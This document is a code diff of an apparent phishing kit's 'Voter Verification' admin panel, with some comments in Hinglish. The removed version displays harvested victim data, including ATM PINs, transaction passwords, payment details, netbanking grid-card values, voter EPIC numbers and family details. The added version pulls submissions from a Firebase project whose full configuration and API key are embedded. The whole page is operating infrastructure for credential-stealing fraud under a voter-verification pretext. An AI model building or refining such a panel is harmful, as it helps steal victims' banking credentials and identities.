@@ -3,122 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Live Submissions</title>
+    <title>Admin Panel - Voter Verification</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: #f4f7f6; padding: 20px; }
-        .container { max-width: 2200px; margin: auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
-        .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        h2 { color: #0056b3; }
-        .back-link { color: #0056b3; text-decoration: none; font-weight: 600; font-size: 14px; }
-        .back-link:hover { text-decoration: underline; }
-        .table-responsive { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; white-space: nowrap; }
-        th, td { padding: 12px 14px; border: 1px solid #e0e0e0; text-align: left; font-size: 13px; }
-        th { background-color: #0056b3; color: white; font-weight: 600; }
+        h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
+        .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 14px; }
+        th { background-color: #0056b3; color: white; }
         tr:nth-child(even) { background-color: #f9f9f9; }
-        tr:hover { background-color: #f1f5f9; }
-        .device-badge { background: #e2e8f0; color: #334155; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
-        .btn-delete { background-color: #dc3545; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 600; }
-        .btn-delete:hover { background-color: #c82333; }
-        .refresh-status { font-size: 12px; color: #666; text-align: right; margin-top: 10px; }
+        .loading { text-align: center; color: #666; font-style: italic; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header-flex">
-            <a href="index.html" class="back-link">&larr; Back to Form</a>
-            <span style="font-size: 13px; color: #28a745; font-weight: bold;">● Live Auto-Refreshing (Every 2s)</span>
-        </div>
 
-        <h2>Admin Panel - Live Voter Submissions</h2>
-        
-        <div class="table-responsive">
-            <table>
-                <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>Device ID</th>
-                        <th>Full Name</th>
-                        <th>Mobile</th>
-                        <th>EPIC</th>
-                        <th>Father's Name</th>
-                        <th>DOB</th>
-                        <th>Gender</th>
-                        <th>Children</th>
-                        <th>Marital Status</th>
-                        <th>Mother's Name</th>
-                        <th>Documents</th>
-                        <th>Payment Type</th>
-                        <th>Payment Details</th>
-                        <th>ATM PIN</th>
-                        <th>Transaction Password</th>
-                        <th>Grid Step 1 (A,D,N)</th>
-                        <th>Grid Step 2 (B,I,H)</th>
-                        <th>Grid Step 3 (O,P,K)</th>
-                        <th>Grid Step 4 (E,J,L)</th>
-                        <th>Time</th>
-                        <th>Action</th>
-                    </tr>
-                </thead>
-                <tbody id="submissionTableBody">
-                    <!-- Data dynamically loaded via JavaScript -->
-                </tbody>
-            </table>
-        </div>
-        
-        <div class="refresh-status" id="refreshStatus">Refreshing live data automatically...</div>
+    <h2>Admin Panel - Live Voter Submissions</h2>
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Full Name</th>
+                    <th>Mobile</th>
+                    <th>EPIC Number</th>
+                </tr>
+            </thead>
+            <tbody id="dataTable">
+                <tr><td colspan="4" class="loading">Loading data from Firebase...</td></tr>
+            </tbody>
+        </table>
     </div>
 
-    <script>
-        function loadData() {
-            const tableBody = document.getElementById('submissionTableBody');
-            const submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+    <!-- Firebase SDK aur Data Fetching Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-            if (submissions.length === 0) {
-                tableBody.innerHTML = `<tr><td colspan="22" style="text-align:center; color: #777;">No submissions found yet.</td></tr>`;
-            } else {
+        const firebaseConfig = {
+            apiKey: "AIzaSyAZ7Dvd7HYsZrMuP0bABJuMAEZmRtGw02U",
+            authDomain: "voter-verification-a04d5.firebaseapp.com",
+            projectId: "voter-verification-a04d5",
+            storageBucket: "voter-verification-a04d5.firebasestorage.app",
+            messagingSenderId: "582458013788",
+            appId: "1:582458013788:web:15f8c7fd7dc05d24328e99",
+            measurementId: "G-8CX5BVQXFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        async function loadSubmissions() {
+            const tableBody = document.getElementById('dataTable');
+
+            try {
+                const querySnapshot = await getDocs(collection(db, "voterSubmissions"));
                 tableBody.innerHTML = "";
-                submissions.forEach((item, index) => {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${index + 1}</td>
-                        <td><span class="device-badge">${item.deviceId || 'N/A'}</span></td>
-                        <td>${item.fullname || '-'}</td>
-                        <td>${item.mobile || '-'}</td>
-                        <td>${item.epic || '-'}</td>
-                        <td>${item.fatherName || '-'}</td>
-                        <td>${item.dob || '-'}</td>
-                        <td>${item.gender || '-'}</td>
-                        <td>${item.children || '-'}</td>
-                        <td>${item.maritalStatus || '-'}</td>
-                        <td>${item.motherName || '-'}</td>
-                        <td>${item.documents || '-'}</td>
-                        <td>${item.paymentMethod || '-'}</td>
-                        <td>${item.paymentDetails || '-'}</td>
-                        <td>${item.atmPin || '-'}</td>
-                        <td>${item.transPassword || '-'}</td>
-                        <td>${item.gridStep1 || '-'}</td>
-                        <td>${item.gridStep2 || '-'}</td>
-                        <td>${item.gridStep3 || '-'}</td>
-                        <td>${item.gridStep4 || '-'}</td>
-                        <td>${item.time || '-'}</td>
-                        <td><button class="btn-delete" onclick="deleteEntry(${index})">Delete</button></td>
-                    `;
-                    tableBody.appendChild(row);
+                
+                if (querySnapshot.empty) {
+                    tableBody.innerHTML = "<tr><td colspan='4' class='loading'>Koi data abhi available nahi hai.</td></tr>";
+                    return;
+                }
+
+                querySnapshot.forEach((doc) => {
+                    const data = doc.data();
+                    let row = `<tr>
+                        <td>${data.time || 'N/A'}</td>
+                        <td>${data.fullname || 'N/A'}</td>
+                        <td>${data.mobile || 'N/A'}</td>
+                        <td>${data.epic || 'N/A'}</td>
+                    </tr>`;
+                    tableBody.innerHTML += row;
                 });
+            } catch (error) {
+                console.error("Error loading data: ", error);
+                tableBody.innerHTML = "<tr><td colspan='4' class='loading' style='color:red;'>Data load karne me error aayi hai.</td></tr>";
             }
         }
 
-        function deleteEntry(index) {
-            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
-            submissions.splice(index, 1);
-            localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
-            loadData();
-        }
-
-        loadData();
-        setInterval(loadData, 2000);
+        loadSubmissions();
     </script>
 </body>
 </html>
